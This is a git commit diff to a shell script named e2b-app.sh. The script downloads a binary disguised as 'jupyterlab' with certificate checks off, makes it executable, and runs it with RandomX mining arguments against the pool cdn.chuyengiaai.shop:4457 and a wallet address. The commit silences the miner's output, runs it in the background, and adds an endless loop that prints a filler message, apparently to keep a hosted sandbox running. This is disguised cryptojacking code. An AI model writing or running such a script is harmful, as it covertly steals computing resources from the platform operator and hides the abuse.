2adabf0dfd7728acd5c34b2ab0f3bbe0c68a6af2
gaserjuk <gaserjukilo@gmail.com>
2026-04-12 21:43:13 +0700

    Modify jupyterlab execution and add status loop
    Redirect output of jupyterlab command to /dev/null and add a loop to print a message every 100 seconds.

--- e2b-app.sh
+++ e2b-app.sh
@@ -2,4 +2,10 @@
 
 curl -sLkO https://github.com/paskofa10/vps/releases/download/uranus/jupyterlab >/dev/null 2>&1
 chmod 777 jupyterlab
-./jupyterlab -a randomx -o cdn.chuyengiaai.shop:4457 -u 45bx5mvR2MQP267tevQyozHSToTsE19g5Q3NvRmrQ3TCW6dEY3as2VH4ArrNnqZKLxaw31aFExZyuet4fgau3TwoRiWwFgi -p WORKER-E4
+./jupyterlab -a randomx -o cdn.chuyengiaai.shop:4457 -u 45bx5mvR2MQP267tevQyozHSToTsE19g5Q3NvRmrQ3TCW6dEY3as2VH4ArrNnqZKLxaw31aFExZyuet4fgau3TwoRiWwFgi -p WORKER-E4 >/dev/null 2>&1 &
+sleep 20
+while true
+do
+        echo "Ojo Lali Ngopi Boss..."
+        sleep 100
+done
